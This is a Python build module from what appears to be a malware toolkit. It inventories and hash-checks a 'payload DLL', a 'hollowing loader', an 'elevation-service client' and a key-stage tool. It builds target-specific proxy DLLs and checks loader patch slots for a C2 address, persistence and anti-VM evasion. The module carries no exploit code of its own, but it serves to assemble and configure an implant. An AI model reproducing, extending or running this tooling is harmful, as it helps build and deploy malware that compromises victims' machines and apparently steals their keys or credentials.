# cklog/build.py -- artifact inventory and build orchestration.
#
# build.py (repo root) is the CLI; this module holds the pieces it needs so the
# same checks are available to auto.py and to tests.
import hashlib
import os

from . import pe, toolchain

# key, relative path, human description, required for a complete payload set.
ARTIFACTS = (
    ("ckdll", "bin/ckdll.dll", "payload DLL", True),
    ("loader", "bin/loader.exe", "hollowing loader", True),
    ("ckdec", "bin/ckdec.exe", "elevation-service client", True),
    ("ckkey", "bin/ckkey.exe", "standalone key stage", True),
    ("ckdll.pdb", "bin/ckdll.pdb", "payload symbols", False),
)

# Loader sentinels: (name, sentinel, slot).
SENTINELS = (
    ("c2", b"CKC2_DEADBEEF_", 256),
    ("persist", b"CKPR____", 8),
    ("anti-vm", b"CKAV0000", 8),
)

# SHA-256 of tracked prebuilt binaries. Regenerate with: python build.py hash
# These guard against accidental corruption or tampering of shipped artifacts.
KNOWN_HASHES = {
    "bin/loader.exe": "76b7f9e64f56b68a8c9208acf3794c6c047a3c0e29b538cda5d1b51f06e43a0b",
    "bin/ckdll.dll": "c3482382e90883721e89cfe41e2527d7ec87a8055ac53661457163862c103fdc",
    "bin/ckdec.exe": "d7761a512474853971f57506b07868920c838e3153f919a9696d3e7e20c18a4a",
    "bin/ckkey.exe": "e122eb6471d96f9f859d213a10fe7ab8501130efb8fa244057277fd820263e71",
    "bin/chkstk.obj": "ea98ccd0364c91fc277ee6a51c0ef44141d9af8d19cdea86627361ec99e7e9a3",
}

PATCHED = {
    "persist": b"CKPR0001",
    "anti-vm": b"CKAV0001",
}


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def read(path):
    with open(path, "rb") as f:
        return f.read()


def artifacts(root):
    """One row per expected artifact, including missing ones."""
    out = []
    for key, rel, desc, required in ARTIFACTS:
        p = os.path.join(root, rel)
        row = {"key": key, "path": p, "rel": rel, "desc": desc,
               "required": required, "exists": os.path.isfile(p),
               "size": 0, "sha256": "", "pe": False}
        if row["exists"]:
            row["size"] = os.path.getsize(p)
            row["sha256"] = sha256_file(p)
            row["pe"] = bool(pe.sections(read(p)))
        out.append(row)
    return out


def sentinels(root):
    """State of the loader's patch slots.

    state: free (unpatched sentinel), patched (already enabled/disabled),
    missing (literal absent), invalid (only found in .text).
    """
    p = os.path.join(root, "bin", "loader.exe")
    if not os.path.isfile(p):
        return []
    blob = read(p)
    out = []
    for name, sentinel, slot in SENTINELS:
        idx = pe.find_sentinel(blob, sentinel, slot)
        ready = pe.patch_ready(blob, sentinel, slot)
        where = pe.section_of(blob, idx) if idx >= 0 else ""
        if ready >= 0:
            state = "free"
        elif ready == -2:
            state = "patched"
        elif idx >= 0:
            state = "invalid"          # Literal exists only where it must not be written
        else:
            state = "missing"
        if name in PATCHED and blob.find(PATCHED[name]) != -1:
            state = "patched"
        out.append({"name": name, "state": state, "offset": idx, "section": where})
    return out


def build_payload(root):
    ok, out = toolchain.run_script(root, "build.bat", timeout=600)
    return ok, out


def build_keytool(root):
    ok, out = toolchain.run_script(root, "build_keytool.bat", timeout=300)
    return ok, out


def build_proxy(root, def_path, out_path, implib_path, pdb_path):
    """Link one target-specific proxy without touching the base payload artifacts."""
    return toolchain.run_script(
        root, "build.bat", timeout=600,
        args=("proxy", def_path, out_path, implib_path, pdb_path))


def toolchain_status(root):
    ok, info = toolchain.compiler_ready(root)
    return ok, info


def verify_hashes(root):
    """Check tracked prebuilt binaries against KNOWN_HASHES.

    Returns (ok, list_of_mismatches). Missing files are not mismatches here;
    artifacts() already reports those. Only files present but with wrong hash
    are reported.
    """
    import hashlib
    mismatches = []
    for rel, expected in KNOWN_HASHES.items():
        path = os.path.join(root, rel)
        if not os.path.isfile(path):
            continue
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                h.update(chunk)
        actual = h.hexdigest()
        if actual != expected:
            mismatches.append((rel, expected, actual))
    return not mismatches, mismatches


def complete(root):
    rows = artifacts(root)
    return all(r["exists"] and r["pe"] for r in rows if r["required"])
